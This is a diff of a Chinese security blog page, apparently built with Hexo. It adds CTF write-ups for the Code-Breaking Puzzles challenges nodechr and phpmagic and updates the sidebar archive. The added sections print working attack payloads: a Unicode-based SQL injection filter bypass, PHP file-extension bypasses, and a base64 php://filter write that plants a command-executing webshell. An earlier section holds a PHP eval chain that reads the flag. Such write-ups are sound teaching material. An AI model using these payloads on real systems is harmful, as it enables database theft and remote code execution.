@@ -261,7 +261,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">1,193</span> / Reading time: <span class="post-count">5 min</span></span>
+                        <span>Word count: <span class="post-count">2,258</span> / Reading time: <span class="post-count">10 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -435,6 +435,49 @@ height:50vh;
 <p>正则的意思 比如传入一个 <code>phpinfo();</code> 然后将<code>;</code>之前的置为空，如果结果全等于<code>;</code>，就执行<code>eval</code>函数，前面<code>/[^\W]+\((?R)?\)/</code>需要匹配到以数字，字母，下划线开头的函数，并且函数不能有参数，而这个<code>(?R)</code>是正则里的递归匹配 能匹配<code>asd(asd(ads()));</code>也就是说我们只能传进去这种嵌套的函数，而且还不能有参数</p>
 <h3 id="getflag-name"><a href="#getflag-name" class="headerlink" title="getflag_name"></a>getflag_name</h3><p>于是，获取flag名称的payload<br><code>print_r(scandir(dirname(getcwd())));</code><br><code>getcwd()</code>:获取当前工作目录，本题就是<code>/var/www/html</code><br><code>dirname()</code> 获取上级目录，于是<code>dirname(getcwd())</code>就是 <code>/var/www</code>,<br>并且得用<code>chdir()</code>函数切换到这个目录来读取这个目录下的文件<br>接着获取当前目录下的所有文件<code>scandir()</code> 但是返回的是一个数组 <code>Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; flag_phpbyp4ss [3] =&gt; html )</code><br>所以得获得<code>flag_phpbyp4ss</code>这个字符串</p>
 <h3 id="get-flag"><a href="#get-flag" class="headerlink" title="get_flag"></a>get_flag</h3><p><code>http://51.158.75.42:8084/?code=print_r(file_get_contents(next(array_reverse(scandir(dirname(chdir(dirname(getcwd()))))))));</code></p>
+<h2 id="easy-nodechr"><a href="#easy-nodechr" class="headerlink" title="easy - nodechr"></a>easy - nodechr</h2><h3 id="题目源码分析"><a href="#题目源码分析" class="headerlink" title="题目源码分析"></a>题目源码分析</h3><p><img src="/code/9.png" alt="9"><br>题目给了源码，根据源码来看这题是一道koa框架的nodejs<br>main函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">async function main() &#123;</span><br><span class="line">    const app = new Koa()</span><br><span class="line">    const router = new Router()</span><br><span class="line">    const db = await sqlite.open(&apos;:memory:&apos;)</span><br><span class="line"></span><br><span class="line">    await db.exec(`CREATE TABLE &quot;main&quot;.&quot;users&quot; (</span><br><span class="line">        &quot;id&quot; INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,</span><br><span class="line">        &quot;username&quot; TEXT NOT NULL,</span><br><span class="line">        &quot;password&quot; TEXT,</span><br><span class="line">        CONSTRAINT &quot;unique_username&quot; UNIQUE (&quot;username&quot;)</span><br><span class="line">    )`)</span><br><span class="line">    await db.exec(`CREATE TABLE &quot;main&quot;.&quot;flags&quot; (</span><br><span class="line">        &quot;id&quot; INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,</span><br><span class="line">        &quot;flag&quot; TEXT NOT NULL</span><br><span class="line">    )`)</span><br><span class="line">    for (let user of config.users) &#123;</span><br><span class="line">        await db.run(`INSERT INTO &quot;users&quot;(&quot;username&quot;, &quot;password&quot;) VALUES (&apos;$&#123;user.username&#125;&apos;, &apos;$&#123;user.password&#125;&apos;)`)</span><br><span class="line">    &#125;</span><br><span class="line">    await db.run(`INSERT INTO &quot;flags&quot;(&quot;flag&quot;) VALUES (&apos;$&#123;config.flag&#125;&apos;)`)</span><br><span class="line"></span><br><span class="line">    router.all(&apos;login&apos;, &apos;/login/&apos;, login).get(&apos;admin&apos;, &apos;/&apos;, admin).get(&apos;static&apos;, &apos;/static/:path(.+)&apos;, static).get(&apos;/source&apos;, source)</span><br><span class="line"></span><br><span class="line">    app.use(views(__dirname + &apos;/views&apos;, &#123;</span><br><span class="line">        map: &#123;</span><br><span class="line">            html: &apos;underscore&apos;</span><br><span class="line">        &#125;,</span><br><span class="line">        extension: &apos;html&apos;</span><br><span class="line">    &#125;)).use(bodyParser()).use(session(app))</span><br><span class="line">    </span><br><span class="line">    app.use(router.routes()).use(router.allowedMethods());</span><br><span class="line">    </span><br><span class="line">    app.keys = config.signed</span><br><span class="line">    app.context.db = db</span><br><span class="line">    app.context.router = router</span><br><span class="line">    app.listen(3000)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>从代码来看，main函数主要是创建连接了sqlite数据库<code>users</code>表里插入了username,password,id<br><code>flags</code>表中插入了id,flag<br>然后还写了路由</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">router.all(&apos;login&apos;, &apos;/login/&apos;, login).get(&apos;admin&apos;, &apos;/&apos;, admin).get(&apos;static&apos;, &apos;/static/:path(.+)&apos;, static).get(&apos;/source&apos;, source)</span><br></pre></td></tr></table></figure>
+<p>safeKeyword方法</p>
+<ul>
+<li>i 不区分大小写匹配</li>
+<li>s 将字符串视为单行,换行符作为普通字符</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function safeKeyword(keyword) &#123;</span><br><span class="line">    if(isString(keyword) &amp;&amp; !keyword.match(/(union|select|;|\-\-)/is)) &#123;</span><br><span class="line">        return keyword</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return undefined</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>对sql注入危险字符串进行了过滤<br>login函数查询代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//将用户名和密码转换为大写</span><br><span class="line"></span><br><span class="line">let user = await ctx.db.get(`SELECT * FROM &quot;users&quot; WHERE &quot;username&quot; = &apos;$&#123;username.toUpperCase()&#125;&apos; AND &quot;password&quot; = &apos;$&#123;password.toUpperCase()&#125;&apos;`)</span><br></pre></td></tr></table></figure>
+<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>根据万能密码能够登陆，想到大概是让我们注入查询出flag</p>
+<p><img src="/code/10.png" alt="9"><br><img src="/code/11.png" alt="9"></p>
+<p>但是<code>union select</code>又被过滤掉了</p>
+<p>一开始想的是通过nodejs的函数<code>readFileSync</code>但是有一个大写的转换，而nodejs函数是区分大小写的，于是行不通了</p>
+<p>发现p神的文章<br><a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html" target="_blank" rel="noopener">https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html</a><br>里面说到了<code>toUpperCase</code>这个函数的问题</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;ı&quot;.toUpperCase() == &apos;I&apos;</span><br><span class="line">&quot;ſ&quot;.toUpperCase() == &apos;S&apos;</span><br></pre></td></tr></table></figure>
+<p>于是，绕过了safeKeyword的正则，可进行union select注入<br>flag在flags表中</p>
+<p>于是username填写(查字段数)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; unıon ſelect flag 1,2,&apos;3</span><br></pre></td></tr></table></figure>
+<p><img src="/code/12.png" alt="9"></p>
+<p>第二位是回显位<br>于是构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; unıon ſelect 1,(ſelect flag from `flags`),&apos;3</span><br></pre></td></tr></table></figure>
+<p>getflag<br><img src="/code/13.png" alt="9"></p>
+<h2 id="easy-phpmagic"><a href="#easy-phpmagic" class="headerlink" title="easy - phpmagic"></a>easy - phpmagic</h2><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>题目是用dig命令（查询域名）去执行我们传入的ip，看题目应该是一道命令执行<br><img src="/code/14.png" alt="9"><br>给出了源码,关键代码(分两)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">//......</span><br><span class="line"></span><br><span class="line">$domain = isset($_POST[&apos;domain&apos;]) ? $_POST[&apos;domain&apos;] : &apos;&apos;;</span><br><span class="line">$log_name = isset($_POST[&apos;log&apos;]) ? $_POST[&apos;log&apos;] : date(&apos;-Y-m-d&apos;);</span><br><span class="line"></span><br><span class="line">//.....</span><br><span class="line"></span><br><span class="line">&lt;?php if(!empty($_POST) &amp;&amp; $domain):</span><br><span class="line">                $command = sprintf(&quot;dig -t A -q %s&quot;, escapeshellarg($domain));</span><br><span class="line">                $output = shell_exec($command);</span><br><span class="line"></span><br><span class="line">                $output = htmlspecialchars($output, ENT_HTML401 | ENT_QUOTES);</span><br><span class="line"></span><br><span class="line">                $log_name = $_SERVER[&apos;SERVER_NAME&apos;] . $log_name;</span><br><span class="line">                if(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), [&apos;php&apos;, &apos;php3&apos;, &apos;php4&apos;, &apos;php5&apos;, &apos;phtml&apos;, &apos;pht&apos;], true)) &#123;</span><br><span class="line">                    file_put_contents($log_name, $output);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                echo $output;</span><br><span class="line">            endif; ?&gt;</span><br></pre></td></tr></table></figure>
+<p>大致是 我们POST的domain的结果会写入到$log_name这个文件中去<br>而这个文件默认是以</p>
+<p><code>date(&#39;-Y-m-d&#39;)</code>做文件名<br>当我们传入POST[‘log’]就会以我们传入为文件名，也就是说文件名可控<br>之后又把文件名拼接为<code>$_SERVER[&#39;SERVER_NAME&#39;] . $log_name;</code><br>然后检测文件名的后缀，如果不在<code>[&#39;php&#39;, &#39;php3&#39;, &#39;php4&#39;, &#39;php5&#39;, &#39;phtml&#39;, &#39;pht&#39;]</code><br>里面<br>就将dig的结果写入文件里</p>
+<h3 id="猜测利用点"><a href="#猜测利用点" class="headerlink" title="猜测利用点"></a>猜测利用点</h3><p>初步猜测是绕过in_array 写入php文件<br>这里绕过php，猜测的方法有</p>
+<ul>
+<li>%00截断</li>
+<li>%0a截断</li>
+<li>/.绕过</li>
+</ul>
+<h3 id="后缀绕过"><a href="#后缀绕过" class="headerlink" title="后缀绕过"></a>后缀绕过</h3><p>访问写入的文件<br><img src="/code/15.png" alt="9"></p>
+<p>这里注意，目录结构<br><code>http://51.158.75.42:8082/data/md5(ip)/host+$_POST[&#39;log&#39;]</code><br>这里我post的log是hu3sky.txt<br>dig的内容是<code>127.0.0.1 | whoami</code><br>这样一来，就有思路了，于是我传入dig的内容<br><code>&lt;?php phpinfo() ;&gt;</code><br><img src="/code/16.png" alt="9"><br>很尴尬，忘了代码中利用<code>htmlspecialchars</code>进行实体编码了<br>不急，一步一步来，先绕过那个后缀判断<br>测试后,0a和/.都能绕过<br>即访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://51.158.75.42:8082/data/a22cdc8b098b7ad0153672e2e3bf5edd/51.158.75.42hu3sky.php%0a</span><br><span class="line">http://51.158.75.42:8082/data/a22cdc8b098b7ad0153672e2e3bf5edd/51.158.75.42hu3sky.php/.</span><br></pre></td></tr></table></figure>
+<h3 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h3><p>p师傅之前有一篇文章<br><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a><br>利用<code>php://filter</code>base64的编码与解码写入文件<br>于是，可解码字符为<br><img src="/code/17.png" alt="9"><br><img src="/code/18.png" alt="9"><br>刚好4个一组，base64解码也是4个byte一组，所以不需要补</p>
+<p>构造payload</p>
+<p>注意修改Host，他会拼接<br>（Host不能包含: /等特殊字符）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">domain: base64后的&lt;?=`ls`;/***</span><br></pre></td></tr></table></figure>
+<p><img src="/code/19.png" alt="9"><br>成功执行<br><img src="/code/20.png" alt="9"><br>final payload<br><code>PD89YGNhdCAnLi4vLi4vLi4vZmxhZ19waHBtYWcxY191cjEnYDsvKioq</code><br><img src="/code/21.png" alt="9"></p>
 
     </article>
     <!-- license  -->
@@ -588,7 +631,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Code-Breaking-Puzzles"><span class="toc-number">1.</span> <span class="toc-text">Code-Breaking Puzzles</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-function"><span class="toc-number">1.1.</span> <span class="toc-text">easy - function</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-pcrewaf"><span class="toc-number">1.2.</span> <span class="toc-text">easy - pcrewaf</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#如何防御"><span class="toc-number">1.2.1.</span> <span class="toc-text">如何防御</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-phplimit"><span class="toc-number">1.3.</span> <span class="toc-text">easy - phplimit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#getflag-name"><span class="toc-number">1.3.1.</span> <span class="toc-text">getflag_name</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get-flag"><span class="toc-number">1.3.2.</span> <span class="toc-text">get_flag</span></a></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Code-Breaking-Puzzles"><span class="toc-number">1.</span> <span class="toc-text">Code-Breaking Puzzles</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-function"><span class="toc-number">1.1.</span> <span class="toc-text">easy - function</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-pcrewaf"><span class="toc-number">1.2.</span> <span class="toc-text">easy - pcrewaf</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#如何防御"><span class="toc-number">1.2.1.</span> <span class="toc-text">如何防御</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-phplimit"><span class="toc-number">1.3.</span> <span class="toc-text">easy - phplimit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#getflag-name"><span class="toc-number">1.3.1.</span> <span class="toc-text">getflag_name</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get-flag"><span class="toc-number">1.3.2.</span> <span class="toc-text">get_flag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-nodechr"><span class="toc-number">1.4.</span> <span class="toc-text">easy - nodechr</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目源码分析"><span class="toc-number">1.4.1.</span> <span class="toc-text">题目源码分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题思路"><span class="toc-number">1.4.2.</span> <span class="toc-text">解题思路</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-phpmagic"><span class="toc-number">1.5.</span> <span class="toc-text">easy - phpmagic</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#代码分析"><span class="toc-number">1.5.1.</span> <span class="toc-text">代码分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#猜测利用点"><span class="toc-number">1.5.2.</span> <span class="toc-text">猜测利用点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#后缀绕过"><span class="toc-number">1.5.3.</span> <span class="toc-text">后缀绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#文件写入"><span class="toc-number">1.5.4.</span> <span class="toc-text">文件写入</span></a></li></ol></li></ol></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -601,12 +644,6 @@ top:50vh;
     <div class="sidebar-content sidebar-content-show-archive">
           <div class="sidebar-panel-archives">
     <!-- 在ejs中将archive按照时间排序 -->
-    
-    
-    
-    
-    
-    
     
     
     
@@ -1512,6 +1549,16 @@ top:50vh;
         </li>
     
     
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/16</span><a class="archive-post-title" href= "/2018/03/16/redtiger level4/" >Redtiger题目</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/15</span><a class="archive-post-title" href= "/2018/03/15/会员日Pwnhub复现/" >会员日Pwnhub题目的复现</a>
+        </li>
+    
+    
     
     
     
@@ -1522,7 +1569,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/08/25/eyou前台getshell/" >eyoucms前台getshell复现</a>
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/08/25/php-security-calendar-2017/" >php-security-calendar-2017</a>
         </li>
     
     
@@ -1531,12 +1578,26 @@ top:50vh;
     
         </ul>
     
-    <div class="archive-year"> 2018 </div>
+    <div class="archive-year"> Invalid date </div>
     <ul class="year-list">
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/16</span><a class="archive-post-title" href= "/2018/03/16/redtiger level4/" >Redtiger题目</a>
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/06/29/The game of bob/" >Bob 1.0.1</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/07/17/JAVA学习情况/" >java学习笔记</a>
         </li>
     
     
@@ -1578,77 +1639,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/08/23/Hooskcms/" >Hooskcms 几个小洞</a>
-        </li>
-    
-    
-    
-    
-    
-        </ul>
-    
-    <div class="archive-year"> Invalid date </div>
-    <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/08/25/php-security-calendar-2017/" >php-security-calendar-2017</a>
-        </li>
-    
-    
-    
-    
-    
-        </ul>
-    
-    <div class="archive-year"> 2018 </div>
-    <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">03/15</span><a class="archive-post-title" href= "/2018/03/15/会员日Pwnhub复现/" >会员日Pwnhub题目的复现</a>
-        </li>
-    
-    
-    
-    
-    
-        </ul>
-    
-    <div class="archive-year"> Invalid date </div>
-    <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/07/17/JAVA学习情况/" >java学习笔记</a>
-        </li>
-    
-    
-    
-    
-    
-        </ul>
-    
-    <div class="archive-year"> Invalid date </div>
-    <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/10/06/destoon/" >destoon前台getshell复现</a>
-        </li>
-    
-    
-    
-    
-    
-        </ul>
-    
-    <div class="archive-year"> Invalid date </div>
-    <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/06/29/The game of bob/" >Bob 1.0.1</a>
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/08/25/eyou前台getshell/" >eyoucms前台getshell复现</a>
         </li>
     
     
@@ -1663,6 +1654,34 @@ top:50vh;
     
         <li class="archive-post-item">
             <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/03/28/cookie与session/" >cookie与session的笔记</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/08/23/Hooskcms/" >Hooskcms 几个小洞</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/10/06/destoon/" >destoon前台getshell复现</a>
         </li>
     
     </div>
@@ -1705,45 +1724,45 @@ jsonContent:
     
         <span class="sidebar-category-name" data-categories="write-up"><span class="iconfont-archer">&#xe60a;</span>write-up</span>
     
-        <span class="sidebar-category-name" data-categories="代码审计"><span class="iconfont-archer">&#xe60a;</span>代码审计</span>
+        <span class="sidebar-category-name" data-categories="学习计划"><span class="iconfont-archer">&#xe60a;</span>学习计划</span>
     
         <span class="sidebar-category-name" data-categories="渗透测试"><span class="iconfont-archer">&#xe60a;</span>渗透测试</span>
     
+        <span class="sidebar-category-name" data-categories="Linux"><span class="iconfont-archer">&#xe60a;</span>Linux</span>
+    
         <span class="sidebar-category-name" data-categories="学习笔记"><span class="iconfont-archer">&#xe60a;</span>学习笔记</span>
     
-        <span class="sidebar-category-name" data-categories="漏洞分析"><span class="iconfont-archer">&#xe60a;</span>漏洞分析</span>
-    
-        <span class="sidebar-category-name" data-categories="Linux"><span class="iconfont-archer">&#xe60a;</span>Linux</span>
+        <span class="sidebar-category-name" data-categories="代码审计"><span class="iconfont-archer">&#xe60a;</span>代码审计</span>
     
         <span class="sidebar-category-name" data-categories="CVE-Request"><span class="iconfont-archer">&#xe60a;</span>CVE-Request</span>
     
-        <span class="sidebar-category-name" data-categories="http协议"><span class="iconfont-archer">&#xe60a;</span>http协议</span>
+        <span class="sidebar-category-name" data-categories="Arbitrary-File-Upload"><span class="iconfont-archer">&#xe60a;</span>Arbitrary-File-Upload</span>
     
         <span class="sidebar-category-name" data-categories="sql注入"><span class="iconfont-archer">&#xe60a;</span>sql注入</span>
     
-        <span class="sidebar-category-name" data-categories="Arbitrary-File-Upload"><span class="iconfont-archer">&#xe60a;</span>Arbitrary-File-Upload</span>
+        <span class="sidebar-category-name" data-categories="漏洞分析"><span class="iconfont-archer">&#xe60a;</span>漏洞分析</span>
     
-        <span class="sidebar-category-name" data-categories="git"><span class="iconfont-archer">&#xe60a;</span>git</span>
+        <span class="sidebar-category-name" data-categories="http协议"><span class="iconfont-archer">&#xe60a;</span>http协议</span>
     
         <span class="sidebar-category-name" data-categories="Empire"><span class="iconfont-archer">&#xe60a;</span>Empire</span>
     
-        <span class="sidebar-category-name" data-categories="scrapy"><span class="iconfont-archer">&#xe60a;</span>scrapy</span>
-    
-        <span class="sidebar-category-name" data-categories="代码执行"><span class="iconfont-archer">&#xe60a;</span>代码执行</span>
-    
-        <span class="sidebar-category-name" data-categories="xxe"><span class="iconfont-archer">&#xe60a;</span>xxe</span>
-    
-        <span class="sidebar-category-name" data-categories="学习计划"><span class="iconfont-archer">&#xe60a;</span>学习计划</span>
-    
-        <span class="sidebar-category-name" data-categories="内网"><span class="iconfont-archer">&#xe60a;</span>内网</span>
-    
-        <span class="sidebar-category-name" data-categories="后门"><span class="iconfont-archer">&#xe60a;</span>后门</span>
+        <span class="sidebar-category-name" data-categories="git"><span class="iconfont-archer">&#xe60a;</span>git</span>
     
         <span class="sidebar-category-name" data-categories="php反序列化"><span class="iconfont-archer">&#xe60a;</span>php反序列化</span>
     
         <span class="sidebar-category-name" data-categories="python"><span class="iconfont-archer">&#xe60a;</span>python</span>
     
+        <span class="sidebar-category-name" data-categories="scrapy"><span class="iconfont-archer">&#xe60a;</span>scrapy</span>
+    
+        <span class="sidebar-category-name" data-categories="代码执行"><span class="iconfont-archer">&#xe60a;</span>代码执行</span>
+    
+        <span class="sidebar-category-name" data-categories="后门"><span class="iconfont-archer">&#xe60a;</span>后门</span>
+    
         <span class="sidebar-category-name" data-categories="线下赛"><span class="iconfont-archer">&#xe60a;</span>线下赛</span>
+    
+        <span class="sidebar-category-name" data-categories="内网"><span class="iconfont-archer">&#xe60a;</span>内网</span>
+    
+        <span class="sidebar-category-name" data-categories="xxe"><span class="iconfont-archer">&#xe60a;</span>xxe</span>
     
     </div>
     <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
